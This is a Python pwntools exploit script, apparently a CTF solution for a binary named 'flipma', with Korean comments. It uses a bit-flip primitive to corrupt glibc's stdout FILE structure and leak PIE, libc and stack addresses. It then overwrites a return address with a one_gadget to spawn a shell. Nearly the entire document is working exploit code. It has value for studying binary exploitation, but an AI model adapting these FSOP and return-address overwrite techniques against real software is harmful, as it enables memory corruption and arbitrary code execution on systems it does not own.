from pwn import *
 
# p = process('./flipma', level="debug")
p = remote("localhost", 31165, level="debug")
e=ELF('./flipma',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
 
# write with bit flip
def write(offset, old, new):
    for i in range(8):
        for j in range(8):
            if (old >> (i*8+j)) & 1 != (new >> (i*8+j)) & 1:
                p.sendlineafter(b"a: ", str(offset+i).encode(),timeout=5)
                p.sendlineafter(b"b: ", str(j).encode())
 
# stdin and stdout offset
stdout_offset = 0xd20
 
# frist puts because we have to get _IO_CURRENTLY_PUTTING
p.sendlineafter(b"a: ", b"1234")
p.sendlineafter(b"b: ", b"1234")
 
# overwrite _IO_read_end and _IO_write_base
# _IO_write_base에 5번째 bit를 flip시켜 큰 값으로 변경하여 출력 값을 확장시킴
# _IO_read_end 포인터도 _IO_write_base와 동일하게 변경해주어야 new_do_write 함수에서
# lseek 시스템 콜이 호출되지 않도록 함 
# +1을 해주는 이유는 a에서 _IO_read_end에 주소값을 바이트 단위로 참조를 하기 때문에
# 시작 바이트가 아닌 . 두번째 바이트를 참조하도록 하기 위해서 +1을 해주었음(주소값은 8바이트)
p.sendlineafter(b"a: ", str(stdout_offset+0x10+1).encode())
p.sendlineafter(b"b: ", b"5")
p.sendlineafter(b"a: ", str(stdout_offset+0x20+1).encode())
p.sendlineafter(b"b: ", b"5")

# memory leak
p.sendlineafter(b"a: ", b"1234")
p.sendlineafter(b"b: ", b"1234")
leak = p.recvuntil(b"we're")
pie_base = u64(leak[0x825:0x825+8]) - 0x4020
libc_base = u64(leak[0x5d:0x5d+8]) - 0x1b3f9f
log.info(f"{hex(pie_base)=}")
log.info(f"{hex(libc_base)=}")
 
# infinity flip
flip_offset = (libc_base + libc.symbols["_IO_2_1_stdin_"]) - (pie_base + 0x4010)
p.sendlineafter(b"a: ", str(-flip_offset+2).encode())
p.sendlineafter(b"b: ", b"0")
 
# stack address leak with fsop
write(stdout_offset+0x10, libc_base+0x1ed723, libc_base + libc.sym.environ-8) # _IO_read_end
write(stdout_offset+0x20, libc_base+0x1ed723, libc_base + libc.sym.environ-8) # _IO_write_base
write(stdout_offset+0x28, libc_base+0x1ed723, libc_base + libc.sym.environ+8) # _IO_write_ptr
# pause()
p.sendlineafter(b"a: ", b"1234")
p.sendlineafter(b"b: ", b"1234")
leak = p.recvuntil(b"we're")
stack = u64(leak[8:8+8]) - 0x100
log.info(f"{hex(stack)=}")
 
# overwrite stack return address with one_gadget
stack_offset = stack-(libc_base + libc.symbols["_IO_2_1_stdin_"])
write(stack_offset, libc_base+0x24083, libc_base+0xe3b01)
 
# make flip negative number for stop flip
p.sendlineafter(b"a: ", str(-flip_offset+3).encode())
p.sendlineafter(b"b: ", b"7")
 
p.interactive()